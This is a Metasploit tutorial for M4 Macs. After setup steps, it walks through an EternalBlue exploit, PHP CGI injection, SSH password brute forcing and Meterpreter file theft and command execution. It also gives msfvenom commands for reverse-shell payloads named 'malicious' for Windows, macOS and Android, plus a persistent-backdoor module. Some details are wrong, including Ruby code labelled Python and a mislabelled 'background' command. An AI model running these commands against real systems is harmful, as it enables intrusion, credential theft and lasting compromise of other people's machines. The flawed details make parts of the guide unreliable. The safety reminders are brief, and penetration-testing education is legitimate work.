
## Table of Contents
1. [Prerequisites](#prerequisites)
2. [Installation Methods](#installation-methods)
3. [Basic Configuration](#basic-configuration)
4. [Core Metasploit Concepts](#core-metasploit-concepts)
5. [Practical Examples and Commands](#practical-examples-and-commands)
6. [Advanced Techniques](#advanced-techniques)
7. [Troubleshooting](#troubleshooting)

## Prerequisites

### System Requirements
```bash
# Check your Mac architecture
uname -m  # Should show arm64 for M4 chips

# Verify system information
sw_vers
```

### Required Software
```bash
# Install Homebrew (if not installed)
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"

# Install essential packages
brew install ruby openssl libxml2 libxslt libyaml readline sqlite3 zlib metasploit-framework
```

## Installation Methods

### Method 1: Using Homebrew (Recommended for M4 Macs)
```bash
# Install Metasploit via Homebrew
brew install metasploit-framework

# Verify installation
msfconsole --version

# If you encounter issues, try:
brew reinstall metasploit-framework
```

### Method 2: Manual Installation with Ruby Version Manager
```bash
# Install rbenv (recommended for managing Ruby versions)
brew install rbenv ruby-build

# Add to your shell profile (~/.zshrc or ~/.bash_profile)
echo 'export PATH="$HOME/.rbenv/bin:$PATH"' >> ~/.zshrc
echo 'eval "$(rbenv init -)"' >> ~/.zshrc

# Reload shell
source ~/.zshrc

# Install Ruby (recommended version: 3.0.x or 3.1.x)
rbenv install 3.1.2
rbenv global 3.1.2

# Install Metasploit dependencies
gem install bundler
gem install metasploit-framework

# Verify installation
msfconsole --version
```

### Method 3: Using Docker (Alternative approach)
```bash
# Install Docker Desktop for Mac (Apple Silicon)
brew install --cask docker

# Pull and run Metasploit container
docker pull kalilinux/kali-rolling
docker run -it kalilinux/kali-rolling msfconsole

# Or use the official Metasploit image
docker pull metasploitframework/metasploit-framework
docker run -it metasploitframework/metasploit-framework msfconsole
```

## Basic Configuration

### Setting Up Database Connection
```bash
# Start PostgreSQL (required for Metasploit)
brew services start postgresql

# Initialize the database
msfdb init

# Verify database connection
msfconsole
msf > db_status
```

### Configuring Network Settings
```bash
# Check network interfaces (important for reverse connections)
ifconfig

# Configure your local IP address for LHOST settings
ip=$(ifconfig en0 | grep inet | awk '$1=="inet" {print $2}')
echo "Local IP: $ip"

# Set global options in Metasploit
msfconsole
msf > setg LHOST 192.168.1.100  # Replace with your actual local IP
msf > setg RHOSTS 192.168.1.50   # Target IP (if known)
```

## Core Metasploit Concepts

### Basic Metasploit Console Operations
```bash
# Start msfconsole
msfconsole

# Basic commands
msf > help                    # Show all commands
msf > show payloads           # Show available payloads
msf > show exploits           # Show available exploits
msf > show auxiliary          # Show auxiliary modules
msf > show encoders           # Show encoder options

# Module search examples
msf > search windows smb      # Search for Windows SMB exploits
msf > search 2017             # Search by year or vulnerability name

# Working with modules
msf > use exploit/windows/smb/ms17_010_eternalblue
msf > show options            # Show required options for current module
```

### Exploit Configuration Example
```bash
# Configure an exploit module
msfconsole

# Select a module and set parameters
msf > use exploit/multi/http/php_cgi_arg_injection
msf > set TARGETURI /index.php
msf > set RHOSTS 192.168.1.50
msf > set LHOST 192.168.1.100

# Check current configuration
msf > show options

# Run the exploit (be careful!)
msf > exploit
```

## Practical Examples and Commands

### Example 1: SMB EternalBlue Exploit on Windows Target
```bash
# Start Metasploit console
msfconsole

# Use the EternalBlue exploit for Windows 7/2008 R2
msf > use exploit/windows/smb/ms17_010_eternalblue

# Configure the module
msf > set RHOSTS 192.168.1.50        # Target IP
msf > set LHOST 192.168.1.100       # Your local IP
msf > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Show options to verify configuration
msf > show options

# Run the exploit
msf > exploit -j                    # Run in background (job)

# If successful, you'll get a meterpreter session
```

### Example 2: Web Application Exploitation (PHP CGI)
```bash
msfconsole

# Use PHP CGI argument injection module
msf > use exploit/multi/http/php_cgi_arg_injection

# Configure for target web server
msf > set RHOSTS 192.168.1.50        # Web server IP
msf > set TARGETURI /index.php      # Target script path
msf > set PAYLOAD php/meterpreter/reverse_tcp

# Set listener and run exploit
msf > set LHOST 192.168.1.100       # Your IP for reverse connection
msf > exploit -j                    # Run in background
```

### Example 3: SSH Brute Force with Auxiliary Module
```bash
# Use auxiliary brute force module for SSH
msfconsole

msf > use auxiliary/scanner/ssh/ssh_login

# Configure credentials and target
msf > set RHOSTS 192.168.1.50        # Target IP
msf > set USER_FILE /path/to/userlist.txt   # User list file
msf > set PASS_FILE /path/to/passlist.txt   # Password list file

# Set additional options
msf > set STOP_ON_SUCCESS true      # Stop after first success
msf > set THREADS 5                 # Number of concurrent threads

# Run the scanner
msf > run                         # Execute the module
```

### Example 4: HTTP Enumeration (Nikto Style)
```bash
# Use auxiliary modules for web enumeration
msfconsole

# Enumerate HTTP services
msf > use auxiliary/scanner/http/http_version

# Configure options for web scanning
msf > set RHOSTS 192.168.1.50        # Target IP
msf > set THREADS 3                 # Concurrency level
msf > run                         # Execute module

# Scan for open ports and services
msf > use auxiliary/scanner/portscan/tcp
msf > set RHOSTS 192.168.1.50        # Target IP
msf > set PORTS 1-1000              # Port range to scan
msf > run                         # Execute port scanner
```

### Example 5: Meterpreter Session Management
```bash
# After gaining access, you'll get a meterpreter session

# List sessions (if multiple sessions exist)
meterpreter > sessions -l         # List all sessions

# Switch to specific session (use ID from above command)
meterpreter > sessions -i 1       # Switch to session 1

# Get system information
meterpreter > sysinfo             # System information
meterpreter > getuid              # Get current user info

# Upload and download files
meterpreter > upload /path/to/local/file /remote/path/
meterpreter > download /remote/path/ /local/path/

# Execute commands
meterpreter > execute -f cmd.exe -i  # Run command in interactive mode
```

## Advanced Techniques

### Creating Custom Payloads
```bash
# Generate payloads using msfvenom (for creating reverse shells)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > malicious.exe

# For Mac targets
msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4445 -f macho > malicious.macho

# For Android targets (if you have access to an Android device)
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4446 R > malicious.apk
```

### Setting Up Persistent Backdoors
```bash
# After gaining meterpreter access, use persistence module

meterpreter > background          # Send session to background

# Use the persistence module for Windows targets
msf > use exploit/windows/local/persistence

# Configure and run persistent backdoor
msf > set SESSION 1               # Session number from list above
msf > set AUTO_RUN true           # Automatically execute on startup
msf > exploit                     # Install persistence mechanism
```

### Creating a Custom Metasploit Module (Python Example)
```python
# Save this as /path/to/custom_module.rb

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Custom Scanner',
      'Description'    => %q{
        A custom scanner for demonstration purposes.
      },
      'Author'         => ['Your Name'],
      'License'        => MSF_LICENSE
    ))
    
    register_options([
      Opt::RPORT(80)
    ])
  end

  def run_host(ip)
    begin
      connect
      # Your scanning logic here
      
      print_good("Found something interesting on #{ip}")
      
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable,
           ::Rex::ConnectionTimeout => e
      print_error("Could not connect to #{ip}: #{e.message}")
    ensure
      disconnect
    end
  end

end
```

### Working with Jobs and Sessions Management
```bash
# List current jobs (background processes)
msf > jobs -l                     # List all active jobs

# Kill specific job by ID
msf > jobs -k 1                   # Kill job with ID 1

# Manage sessions more effectively
meterpreter > sessions -l         # List session details
meterpreter > sessions -i 2       # Interact with session 2

# Background current session to return to msfconsole
meterpreter > background          # Send meterpreter back to foreground
```

## Important Safety Considerations and Best Practices

### Critical Safety Reminders:
```bash
# Always remember these critical points:

1. ONLY target systems you own or have explicit permission to test (DoS, etc.)
2. Use virtual machines for testing - never target production systems
3. Have a clear understanding of legal implications before proceeding
4. Test only in controlled environments with proper authorization

# Example of safe environment setup:
# Create isolated VM network
msfconsole > setg LHOST 192.168.56.101   # Set default local host
msfconsole > setg LPORT 4444            # Set default port
```

### Ethical Testing Commands Checklist:
```bash
# Before starting any actual exploitation:

# Verify target is accessible
msfconsole > use auxiliary/scanner/portscan/tcp
msfconsole > set RHOSTS TARGET_IP

# Test connectivity to verify proper setup before attacking

# Always start with reconnaissance phase (not exploit)
msfconsole > use auxiliary/scanner/http/http_version
```

### Proper Session Management:
```bash
# After completing work, clean up sessions properly:

meterpreter > exit                # Exit current meterpreter session
msfconsole > sessions -K          # Kill all active sessions

# If you have multiple jobs running:
msfconsole > jobs -k              # Kill all background jobs
```

This comprehensive guide covers practical exploitation techniques with Metasploit specifically tailored for ARM-based systems, though most commands will work on standard x86/x64 architectures as well. Always remember to use these tools ethically and only in appropriate testing environments!

